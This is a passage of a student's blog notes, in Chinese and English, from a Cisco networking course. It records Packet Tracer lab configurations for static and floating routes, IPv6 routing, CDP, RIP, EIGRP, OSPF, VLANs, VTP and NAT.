class="headerlink" title="1.1.4.5 Configuring and Verifying a Small Network"></a>1.1.4.5 Configuring and Verifying a Small Network</h2><p>RTA</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">enable secret class<br>line console <span class="hljs-number">0</span><br>password cisco<br>login<br><span class="hljs-keyword">exit</span><br>line vty <span class="hljs-number">0</span><br>password class<br>login<br><span class="hljs-keyword">exit</span><br>service password-encrytion<br><br>interf g0/<span class="hljs-number">0</span> <br>ip add <span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>des pc1<br>no shutdown<br>ex<br>interf g0/<span class="hljs-number">1</span><br>ip add <span class="hljs-number">10.10</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>dec pc2<br>no shutdown<br>ex<br><br>copy running-config startup-config<br></code></pre></td></tr></table></figure><p>SW1</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">int</span> vlan1<br>ip add <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.2</span> <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>no shutdown<br>ex<br>ip <span class="hljs-keyword">default</span>-gateway <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span><br>copy running-config startup-config<br></code></pre></td></tr></table></figure><p>SW2</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">int</span> vlan1<br>ip add <span class="hljs-number">10.10.20.2</span> <span class="hljs-number">255.255.255.0</span><br><span class="hljs-literal">no</span> shutdown<br>ex<br>ip default-gateway <span class="hljs-number">10.10.20.1</span><br></code></pre></td></tr></table></figure><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200225132814418.png" class="" title="image-20200225132814418"><h2 id="1-3-2-5-Investigating-Directly-Connected-Routes"><a href="#1-3-2-5-Investigating-Directly-Connected-Routes" class="headerlink" title="1.3.2.5 Investigating Directly Connected Routes"></a>1.3.2.5 Investigating Directly Connected Routes</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227092952674.png" class="" title="image-20200227092952674"><p>PC1可ping通PC2和PC3</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227093406101.png" class="" title="image-20200227093406101"><p>PC3可ping通PC4</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227093322437.png" class="" title="image-20200227093322437"><p>show ip route static 查看静态路由转发</p><p>v4可通，v6不通</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227100354728.png" class="" title="image-20200227100354728"><p>手动控制出口端口后又可通，并且查看路由表之后，发现没有FE的，都是2001的，说明是路由设置的问题</p><hr><h2 id="lab1-amp-2-27笔记"><a href="#lab1-amp-2-27笔记" class="headerlink" title="lab1&amp;2.27笔记"></a>lab1&amp;2.27笔记</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227082933206.png" class="" title="image-20200227082933206"><p>点这里关机，然后拖入模块</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/IAEW4JL%60HJEWNF6@I%5BUD1T2.png" class="" title="img"><p>这个模块是有serial口的</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227083957606.png" class="" title="image-20200227083957606"><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">config <span class="hljs-built_in">t</span><br>no ip domain-<span class="hljs-built_in">lookup</span><br></code></pre></td></tr></table></figure><blockquote><p>router&gt; 是处于用户模式</p><p>router# 是处于特权模式 在用户界面使用enable启用</p><p>show hosts 显示分配了主机名的ip地址</p><p>设置远程登录</p><p>(config)line vty 0 4#虚拟终端</p><p>(config-line)password 123</p><p>(config-line)login #允许远程登录</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227085924224.png" class="" title="image-20200227085924224"><p>enable secret 权限更高，可覆盖enable password</p></blockquote><h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> <span class="hljs-built_in">s0</span>/<span class="hljs-number">1</span><br><span class="hljs-symbol">enable</span> <span class="hljs-keyword">cdp</span> <br><span class="hljs-symbol">no</span> shut<br><span class="hljs-symbol">ex</span><br><span class="hljs-keyword">cdp</span> run<br></code></pre></td></tr></table></figure><blockquote><p>端口下 cdp enable</p></blockquote><h2 id="3-3笔记"><a href="#3-3笔记" class="headerlink" title="3/3笔记"></a>3/3笔记</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303101529289.png" class="" title="image-20200303101529289"><p>浮动静态路由器：</p><ul><li>备份动态路由协议已发现的路由</li><li>相比原动态路由协议，配置的管理距离更长</li></ul><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>ip route 网段 掩码 下一跳端口ip</p><p>ip route 172.16.1.0 255.255.255.0 172.16.2.2</p><p>ipv6 route 2001:DB8:ACAD:3::/64 2001:DB8:ACAD:4::2</p><h3 id="完全指定静态路由"><a href="#完全指定静态路由" class="headerlink" title="完全指定静态路由"></a>完全指定静态路由</h3><p>ip route 网段 掩码 端口</p><p>R1(config)# ip route 192.168.2.0 255.255.255.0 GigabitEthernet 0/1</p><p><strong>如果 IPv6 静态路由使用 IPv6 本地链路地址作为下一跳地址，则必须使用完全指定静态路由（包含送出接口）</strong></p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200421091844171.png" class="" title="image-20200421091844171"><h3 id="默认静态路由"><a href="#默认静态路由" class="headerlink" title="默认静态路由"></a>默认静态路由</h3><p>ip route 0.0.0.0 0.0.0.0 172.168.2.2</p><p>ipv6 route ::/0 2001:DB8:ACAD:4::2</p><h3 id="浮动静态路由"><a href="#浮动静态路由" class="headerlink" title="!!! 浮动静态路由"></a>!!! 浮动静态路由</h3><p>ip route 0.0.0.0 0.0.0.0 172.16.2.2 # 默认静态路由</p><p>ipv6 route ::/0 ipv6_add </p><p>ip route 0.0.0.0 0.0.0.0 10.10.10.2 5 # 管理距离为5</p><p>ipv6 route ::/0 ipv6_add  5</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303110803109.png" class="" title="image-20200303110803109"><h2 id="2-2-4-4-Configuring-IPv6-Static-and-Default-Routes"><a href="#2-2-4-4-Configuring-IPv6-Static-and-Default-Routes" class="headerlink" title="2.2.4.4 Configuring IPv6 Static and Default Routes"></a>2.2.4.4 Configuring IPv6 Static and Default Routes</h2><p>R1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ipv6</span> unicast-routing<br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:<span class="hljs-number">2</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">001</span>::<span class="hljs-number">2</span> # 递归静态路由<br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:<span class="hljs-number">3</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">001</span>::<span class="hljs-number">2</span><br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">002</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">001</span>::<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>R2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ipv6</span> unicast-routing<br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">001</span>::<span class="hljs-number">1</span><br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:<span class="hljs-number">3</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">002</span>::<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>R3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ipv6</span> unicast-routing<br><span class="hljs-attribute">IPV6</span> ROUTE ::/<span class="hljs-number">0</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">002</span>::<span class="hljs-number">1</span> # 默认路由<br></code></pre></td></tr></table></figure><h2 id="2-2-5-5-Configuring-Floating-Static-Routes"><a href="#2-2-5-5-Configuring-Floating-Static-Routes" class="headerlink" title="2.2.5.5 Configuring Floating Static Routes"></a>2.2.5.5 Configuring Floating Static Routes</h2><p>Edge</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span> route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">ipv6</span> route ::/<span class="hljs-number">0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ipv6</span> route ::/<span class="hljs-number">0</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:A:<span class="hljs-number">2</span>::<span class="hljs-number">1</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="2-3-2-3"><a href="#2-3-2-3" class="headerlink" title="2.3.2.3"></a>2.3.2.3</h2><p>R2</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ip</span> route <span class="hljs-number">172.31.1.128</span> <span class="hljs-number">255.255.255.192</span> <span class="hljs-number">172.31.1.198</span><br><span class="hljs-literal">no</span> ip route <span class="hljs-number">172.31.1.128</span> <span class="hljs-number">255.255.255.192</span> <span class="hljs-number">172.31.1.194</span><br>ip route <span class="hljs-number">172.31.1.0</span> <span class="hljs-number">255.255.255.128</span> <span class="hljs-number">172.31.1.194</span><br><span class="hljs-literal">no</span> ip route <span class="hljs-number">172.31.1.0</span> <span class="hljs-number">255.255.255.128</span> <span class="hljs-number">172.31.1.198</span><br></code></pre></td></tr></table></figure><p>R3</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ip</span> route <span class="hljs-number">172.31.1.0</span> <span class="hljs-number">255.255.255.128</span> <span class="hljs-number">172.31.1.197</span><br></code></pre></td></tr></table></figure><h2 id="lab-3-amp-3-10"><a href="#lab-3-amp-3-10" class="headerlink" title="lab 3&amp;3/10"></a>lab 3&amp;3/10</h2><blockquote><p><strong>The Enable Password</strong></p><p>The <em>enable password</em> controls access to privilege mode. This is a VERY important password because in privilege mode you can make configuration changes.</p><p>Krang(config)#enable password frodo</p><p>You can securely encrypt the <em>enable password</em>, by using the enable secret command.</p><p>Krang(config)#enable secret hobbits</p><p>If you have both passwords, the enable secret is the password used.</p></blockquote><p>enable secret password 储存加密的密码，会覆盖enable password frodo</p><hr><p>在端口上启用cdp run，本机路由器show cdp nei 看不见</p><p>而在别的路由上可以看见</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200310104354035.png" class="" title="image-20200310104354035"><p>如右边路由f0/0 只在端口上cdp run。左边端口和路由都cdp run了。左边show cdp nei能看见右边的端口，右边show cdp nei 看不见任何记录</p><h2 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">(config-<span class="hljs-keyword">if</span>)description FastEthernet <span class="hljs-keyword">interface</span> <span class="hljs-symbol">on</span> <span class="hljs-symbol">Router</span> <span class="hljs-symbol">1</span><br></code></pre></td></tr></table></figure><h2 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">clear arp<br></code></pre></td></tr></table></figure><h2 id="Lab-6"><a href="#Lab-6" class="headerlink" title="Lab 6"></a>Lab 6</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">(<span class="hljs-built_in">config</span>)<span class="hljs-comment">#ip host California 195.42.36.10</span><br><span class="hljs-keyword">show </span>hosts<br></code></pre></td></tr></table></figure><h2 id="Lab-7"><a href="#Lab-7" class="headerlink" title="Lab 7"></a>Lab 7</h2><ul><li>Add RIP routing protocol to the router. What command does this?</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Router2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#router</span> rip<br><br><span class="hljs-function"><span class="hljs-title">Router2</span><span class="hljs-params">(config-router)</span></span>#<br></code></pre></td></tr></table></figure><ul><li>Add the network(s) that Router 2 is directly connected to. What statements will do this?</li></ul><p><code>Router2(config-router)#network 10.0.0.0</code></p><blockquote><p>查看更新信息使用 debug ip rip 命令时，要用 terminal monitor 命令来接收debug 命令产生的输出。debug ip rip 会把更新信息发送给控制台会话。</p><p>Router#debug ip rip</p><p>RIP protocol debugging is on</p><p>Router#terminal monitor</p><p>接下来就是输出的更新信息，但是它会不断的出来，所以要停止它就得输入 un all 或 undebug all 或 no debug ip rip 即可停止信息的输出</p><p>Router#un all</p><p><a href="http://blog.sina.com.cn/s/blog_62fd2bcb0102voc0.html">原文</a></p></blockquote><h2 id="3-17-amp-Lab-9"><a href="#3-17-amp-Lab-9" class="headerlink" title="3.17&amp;Lab 9"></a>3.17&amp;Lab 9</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200317102740553.png" class="" title="image-20200317102740553"><p>路由器连接到server，并且server开启tftp时候</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Tampa<span class="hljs-comment"># copy running-config tftp</span><br><span class="hljs-keyword">Address </span><span class="hljs-keyword">or </span>name of remote host []?<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br>储存的文件名：Tampa_config<br></code></pre></td></tr></table></figure><h2 id="Lab10待补-不熟！！！"><a href="#Lab10待补-不熟！！！" class="headerlink" title="Lab10待补-不熟！！！"></a>Lab10待补-不熟！！！</h2><h2 id="lab13"><a href="#lab13" class="headerlink" title="lab13"></a>lab13</h2><p>*<em>交换机之间的线用copper cross-over *</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sw1</span>:<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">3</span><br><span class="hljs-attribute">switchport</span> mode access<br><span class="hljs-attribute">switchport</span> access vlan <span class="hljs-number">2</span><br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">4</span><br><span class="hljs-attribute">switchport</span> mode access<br><span class="hljs-attribute">switchport</span> access vlan <span class="hljs-number">3</span><br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">switchport</span> mode trunk<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">switchport</span> mode trunk<br><br><span class="hljs-attribute">sw2</span>:<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">switchport</span> mode access<br><span class="hljs-attribute">switchport</span> access vlan <span class="hljs-number">2</span><br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">3</span><br><span class="hljs-attribute">switchport</span> mode access<br><span class="hljs-attribute">switchport</span> access vlan <span class="hljs-number">3</span><br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">switchport</span> mode trunk<br><br><span class="hljs-attribute">router</span>:<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">encapsulation</span> dot<span class="hljs-number">1</span>Q <span class="hljs-number">2</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">192.168.1.254</span> <span class="hljs-number">255.255.255.0</span><br><span class="hljs-attribute">no</span> shut<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">encapsulation</span> dot<span class="hljs-number">1</span>Q <span class="hljs-number">3</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">192.168.2.254</span> <span class="hljs-number">255.255.255.0</span><br><span class="hljs-attribute">no</span> shut<br><span class="hljs-attribute">int</span> f<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span> shut<br></code></pre></td></tr></table></figure><p><strong>VTP</strong></p><p> VLAN 中继协议 (VTP) 的信息。VTP 可简化交换网络中的管理。在一台 VTP 服务器上配置新的 VLAN 时，该 VLAN 将通过域中的所有交换机进行分发。这样可以减少在各处配置相同 VLAN 的需求。VTP 是一种 Cisco 专有协议</p><p><a href="https://www.cisco.com/c/en/us/support/docs/lan-switching/vtp/10558-21.html">官方解释</a></p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200319213900208.png" class="" title="image-20200319213900208"><p><strong>3</strong>. 在switch1合适的配置模式下设置如下命令。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vtp mode server<br>vtp domain cisco<br>vlan 10<br>vlan 100<br></code></pre></td></tr></table></figure><p> 在switch2合适的配置模式下设置如下命令。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">vtp <span class="hljs-keyword">client</span><br>vtp domain cisco<br></code></pre></td></tr></table></figure><h2 id="Lab-14"><a href="#Lab-14" class="headerlink" title="Lab 14"></a>Lab 14</h2><p>EIGRP</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">Router(<span class="hljs-params">config</span>)</span>#router eigrp ?<br>  &lt;<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>&gt;  Autonomous system number<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">router</span>)</span>#network <span class="hljs-number">12.1</span>.<span class="hljs-number">1.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">router</span>)</span>#network <span class="hljs-number">2.2</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">0.0</span>　（正/反掩码皆可）<br></code></pre></td></tr></table></figure><p>RIP</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Router</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#router</span> rip<br>version <span class="hljs-number">2</span><br>network <span class="hljs-number">120.10</span>.<span class="hljs-number">10.0</span><br></code></pre></td></tr></table></figure><p>OSPF</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Router(config)#router<span class="hljs-built_in"> ospf </span>?<br>  &lt;1-65535&gt;  Process ID<br>network 120.10.10.0 0.0.0.252<span class="hljs-built_in"> area </span>?<br> <span class="hljs-built_in"> area </span> <span class="hljs-builtin-name">Set</span> the<span class="hljs-built_in"> OSPF area </span>ID<br></code></pre></td></tr></table></figure><h2 id="lab-15"><a href="#lab-15" class="headerlink" title="lab 15"></a>lab 15</h2><p>NAT,详见<a href="https://blog.csdn.net/besti_white/article/details/81430894">link</a></p><p>端口多路复用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Access</span>-list <span class="hljs-number">12</span> permit <span class="hljs-number">192.168.101.0</span> <span class="hljs-number">0.0.0.255</span><br><span class="hljs-attribute">ip</span> nat inside source list <span class="hljs-number">12</span> interface serial <span class="hljs-number">1</span>/<span class="hljs-number">0</span> overload<br></code></pre></td></tr></table></figure><p>NAT pool</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">interface</span> loopback <span class="hljs-number">0</span><br>ip address <span class="hljs-number">192.168.200.1</span> <span class="hljs-number">255.255.255.0</span><br>!<br>ip nat pool goodpool <span class="hljs-number">192.168.200.2</span> <span class="hljs-number">192.168.200.101</span> netmask <span class="hljs-number">255.255.255.0</span><br>access-list <span class="hljs-number">10</span> permit <span class="hljs-number">192.168.101.0</span> <span class="hljs-number">0.0.0.255</span><br>ip nat inside source list <span class="hljs-number">10</span> pool goodpool<br><br></code></pre></td></tr></table></figure><h2 id="Lab-16"><a href="#Lab-16" class="headerlink" title="Lab 16"></a>Lab 16</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">fastethernet</span> <span class="hljs-symbol">0</span>/<span class="hljs-symbol">11</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">trunk</span><br><br><br><span class="hljs-symbol">interface</span> <span class="hljs-symbol">fastethernet</span> <span class="hljs-symbol">0</span>/<span class="hljs-symbol">11</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">dynamic</span> <span class="hljs-symbol">desirable</span><br></code></pre></td></tr></table></figure><h2 id="3-26"><a href="#3-26" class="headerlink" title="3/26"></a>3/26</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200326091535593.png" class="" title="image-20200326091535593"><h2 id="3-31"><a href="#3-31" class="headerlink" title="3/31"></a>3/31</h2><h3 id="RIPv2自动汇总"><a href="#RIPv2自动汇总" class="headerlink" title="RIPv2自动汇总"></a>RIPv2自动汇总</h3><p>使用 <strong>no auto-summary</strong> 路由器配置模式命令，修改默认 RIPv2 自动汇总行为。当使用 RIPv1 时，此命令无效。当已禁用自动汇总时，RIPv2 不会再将网络汇总到其在边界路由器上的有类地址。</p><h3 id="配置被动接口"><a href="#配置被动接口" class="headerlink" title="配置被动接口"></a>配置被动接口</h3><p>默认情况下，将 RIP 更新从所有启用 RIP 的接口发出。使用 <strong>passive-interface</strong> 路由器配置命令阻止通过路由器接口传输路由更新，但是仍然允许将该网络通告至其他路由器。该命令会停止指定接口的路由更新。但是，从其他接口发出的路由更新中仍通告指定接口所属的网络。可以使用 <strong>passive-interface default</strong> 命令将所有接口设为被动。不能设为被动的接口可以使用 <strong>no passive-interface</strong> 命令重新启用。</p><blockquote><p>router rip</p><p>passive-interface g0/0</p><p>end</p></blockquote><blockquote><p>传播默认路由</p><p>边缘路由器必须配置：</p><ul><li><p>使用 <strong>ip route 0.0.0.0 0.0.0.0</strong> next_ip 命令的默认静态路由。</p></li><li><p><strong>default-information originate</strong> 路由器配置命令。这会指导 R1 通过在 RIP 更新中传播静态默认路由来产生默认信息。</p></li></ul><p>在一个单出口网络内启用RIP协议，在网络出口处的路由器需要向RIP域内传播一条默认路由，这样，域内的路由器就可以通过默认路由访问外部网络。下面我们就用试验来模拟这个环境。到目前为止；通过RIP传递默认路由共有5种方法。<br>1 default-information<br>2 手工写一条默认路由（到NULL0） 然后重分布到RIP中<br>3 手工写一条默认路由（到NULL0）在进程中宣告<br>4 ip default-network<br>5在接口汇总0.0.0.0/0到NULL0的路由</p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200331115232904.png" class="" title="image-20200331115232904"><h2 id="3-2-1-8-Troubleshooting-Static-Routes"><a href="#3-2-1-8-Troubleshooting-Static-Routes" class="headerlink" title="3.2.1.8 Troubleshooting Static Routes"></a>3.2.1.8 Troubleshooting Static 